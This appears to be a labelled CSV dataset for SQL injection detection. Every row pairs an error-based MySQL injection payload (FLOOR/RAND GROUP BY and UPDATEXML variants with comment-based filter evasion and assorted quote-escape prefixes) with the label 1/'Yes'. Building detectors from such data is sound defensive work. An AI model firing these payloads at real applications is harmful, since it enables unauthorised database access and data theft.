input_text,Label,classification, ,,,,,,
"))/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/((7358=7358",1,Yes,,,,,,,
")/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)/**/AND/**/(2047=2047",1,Yes,,,,,,,
"""/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/siEZ",1,Yes,,,,,,,
"'/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/KFQp",1,Yes,,,,,,,
"')/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/vFFd",1,Yes,,,,,,,
")/**/OR/**/ROW(4878,2257)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(4878=4878,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/6072/**/UNION/**/SELECT/**/8160/**/UNION/**/SELECT/**/5030/**/UNION/**/SELECT/**/9427)a/**/GROUP/**/BY/**/x)--/**/oPJg",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)#",1,Yes,,,,,,,
"]-(SELECT/**/0/**/WHERE/**/6261=6261/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))|[",1,Yes.,,,,,,,
"""=""""/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/""""=""",1,Yes,,,,,,,
"`=``/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/``=`",1,Yes,,,,,,,
"`)/**/WHERE/**/5356=5356/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/rkbE",1,Yes,,,,,,,
"`/**/WHERE/**/5126=5126/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/BWNr",1,Yes,,,,,,,
")/**/AS/**/aHsF/**/WHERE/**/7310=7310/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/rhAA",1,Yes,,,,,,,
""")/**/AS/**/xGtX/**/WHERE/**/4323=4323/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/usQu",1,Yes,,,,,,,
"')/**/AS/**/kEjO/**/WHERE/**/2572=2572/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/LdUQ",1,Yes,,,,,,,
"))/**/AS/**/DmuT/**/WHERE/**/2410=2410/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/XZIr",1,Yes,,,,,,,
"""))/**/AS/**/gAWy/**/WHERE/**/6098=6098/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/KksV",1,Yes,,,,,,,
"'))/**/AS/**/VhWD/**/WHERE/**/9048=9048/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/eLWq",1,Yes,,,,,,,
"+(SELECT/**/0x44547a69/**/WHERE/**/5411=5411/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/*",1,Yes.,,,,,,,
"+(SELECT/**/socR/**/WHERE/**/7874=7874/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNIO",1,Yes,,,,,,,
"||(SELECT/**/0x6f734842/**/WHERE/**/6936=6936/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))||",1,Yes,,,,,,,
"||(SELECT/**/0x65637167/**/FROM/**/DUAL/**/WHERE/**/8972=8972/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))||",1,Yes,,,,,,,
"'+(SELECT/**/0x4d744e64/**/WHERE/**/6252=6252/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))+'",1,Yes.,,,,,,,
"'||(SELECT/**/0x637a6646/**/FROM/**/DUAL/**/WHERE/**/2035=2035/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))||'",1,Yes,,,,,,,
"'||(SELECT/**/0x684f6c51/**/WHERE/**/6707=6707/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x))||'",1,Yes,,,,,,,
"/**/WHERE/**/7076=7076/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/UNyg",1,Yes,,,,,,,
"""/**/WHERE/**/2901=2901/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/aPhf",1,Yes,,,,,,,
"'/**/WHERE/**/1393=1393/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/QHHs",1,Yes,,,,,,,
")/**/WHERE/**/3666=3666/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/uEdw",1,Yes,,,,,,,
""")/**/WHERE/**/9107=9107/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/SLUS",1,Yes,,,,,,,
"')/**/WHERE/**/3419=3419/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/Rkxe",1,Yes,,,,,,,
"'/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/OR/**/'Jnku'='ivmc",1,Yes,,,,,,,
"/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)#/**/OeLx",1,Yes.,,,,,,,
"/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/rSuu",1,Yes,,,,,,,
"""/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/""PrWz""/**/LIKE/**/""PrWz",1,Yes,,,,,,,
""")))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(((""AmDH""/**/LIKE/**/""AmDH",1,Yes,,,,,,,
"""))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/((""EcVb""/**/LIKE/**/""EcVb",1,Yes,,,,,,,
""")/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(""azMS""/**/LIKE/**/""azMS",1,Yes,,,,,,,
"""/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/""UdZU""=""UdZU",1,Yes,,,,,,,
""")))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(((""Flao""=""Flao",1,Yes,,,,,,,
"""))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/((""QXyJ""=""QXyJ",1,Yes,,,,,,,
""")/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(""cOpI""=""cOpI",1,Yes,,,,,,,
"'/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/'lxIG'/**/LIKE/**/'lxIG",1,Yes,,,,,,,
"%'/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/'GljE%'='GljE",1,Yes,,,,,,,
"')))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/((('XjeA'/**/LIKE/**/'XjeA",1,Yes,,,,,,,
"'))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(('FjGX'/**/LIKE/**/'FjGX",1,Yes,,,,,,,
"')/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/('UWwR'/**/LIKE/**/'UWwR",1,Yes,,,,,,,
"'/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/'qgva'='qgva",1,Yes.,,,,,,,
"')))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/((('cUpp'='cUpp",1,Yes,,,,,,,
"'))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(('XdnV'='XdnV",1,Yes,,,,,,,
"')/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/('nvOR'='nvOR",1,Yes.,,,,,,,
"/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)",1,Yes,,,,,,,
")))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(((5179=5179",1,Yes,,,,,,,
"))/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/((8557=8557",1,Yes,,,,,,,
")/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)/**/AND/**/(2293=2293",1,Yes,,,,,,,
"""/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/Gcfy",1,Yes,,,,,,,
"'/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/HDOi",1,Yes,,,,,,,
"')/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/plzJ",1,Yes,,,,,,,
")/**/AND/**/ROW(5949,4566)>(SELECT/**/COUNT(*),CONCAT(0x7162707071,(SELECT/**/(ELT(5949=5949,1))),0x7171706a71,FLOOR(RAND(0)*2))x/**/FROM/**/(SELECT/**/4505/**/UNION/**/SELECT/**/8040/**/UNION/**/SELECT/**/1112/**/UNION/**/SELECT/**/8942)a/**/GROUP/**/BY/**/x)--/**/PugU",1,Yes,,,,,,,
"'/**/IN/**/BOOLEAN/**/MODE)/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)#",1,Yes.,,,,,,,
"]-(SELECT/**/0/**/WHERE/**/4522=4522/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175))|[",1,Yes,,,,,,,
"""=""""/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)/**/AND/**/""""=""",1,Yes,,,,,,,
"`=``/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)/**/AND/**/``=`",1,Yes.,,,,,,,
"`)/**/WHERE/**/5219=5219/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)--/**/eUNx",1,Yes,,,,,,,
"`/**/WHERE/**/9460=9460/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)--/**/iTXn",1,Yes,,,,,,,
")/**/AS/**/ExOr/**/WHERE/**/8413=8413/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)--/**/WLNf",1,Yes,,,,,,,
""")/**/AS/**/atEZ/**/WHERE/**/7052=7052/**/OR/**/UPDATEXML(3063,CONCAT(0x2e,0x7162707071,(SELECT/**/(ELT(3063=3063,1))),0x7171706a71),8175)--/**/jmhB",1,Yes,,,,,,,
